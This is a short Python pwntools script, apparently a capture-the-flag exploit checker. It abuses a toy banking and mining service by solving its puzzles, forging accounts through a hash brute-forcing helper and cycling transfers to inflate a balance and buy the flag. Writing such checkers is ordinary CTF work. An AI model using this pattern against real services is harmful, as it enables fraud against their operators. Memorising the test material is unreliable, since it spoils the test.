#!usr/bin/env python3
# -*- coding: utf-8 -*-
import time
import sys
import threading
from pwn import *
import select
import danish
import hash_brute
PWNLIB_NOTERM=1

DEBUG = True
last_line = ""
done = False
flag = str(input("flag: ")).replace("\n", "")
ip , port = input("ip/port: ").split(":")
def test_exploit():
    global ip, port
    try:
        r = remote(str(ip), int(port))

        hash = [0] * 65
        # Create account 0x123
        hash = hash_brute.block(hash, hash_brute.cr_acc(0x123, [0] * 16))
        r.sendline("2\n123\n")

        # Log in
        r.sendline("1\n123\n")

        # Start mining
        r.sendline("2")

        time.sleep(0.1)

        for i in range(4):
            r.recvuntil("Problem ", timeout=2)
            r.recvline()
            problem = r.recvline().decode("utf-8").strip()[:-1]
            if DEBUG:
                print("Problem:", problem)

            ans = danish.solve(problem)
            if DEBUG:
                print("Solution: " + ans)
            r.sendline(ans) # Start mining
            time.sleep(0.1)
        # Done mining, log out
        r.sendline("4")

        hash = hash_brute.block(hash, hash_brute.mine(0x123))

        sol, hash = hash_brute.solve(hash, 0x123, 5.2, 30)

        for (receiver, password, amount) in sol:
            rec_hex = hex(receiver)[2:]

            passw = ""
            for c in password:
                if c == 0:
                    break
                else:
                    passw += chr(c)

            # Create account
            r.sendline("2\n" + rec_hex + "\n" + passw)

            # Log into main account
            r.sendline("1\n123\n")

            # Send money
            r.sendline("1\n" + rec_hex + "\n" + str(amount))

            # Log out
            r.sendline("4")

            # Log into new account
            r.sendline("1\n" + rec_hex + "\n" + passw)

            # Send back
            r.sendline("1\n123\n" + str(amount))

            # Log out
            r.sendline("4\n3\n")

            time.sleep(0.1)

        # Log into main account
        r.sendline("1\n123\n")
        time.sleep(0.3)
        r.sendline("3\n") #buy flag
        response = r.recvall()
        print(response)
        return response
    except:
        return ""
for i in range(10):
    if str(flag) in str(test_exploit()):
        exit(0)
exit(1)
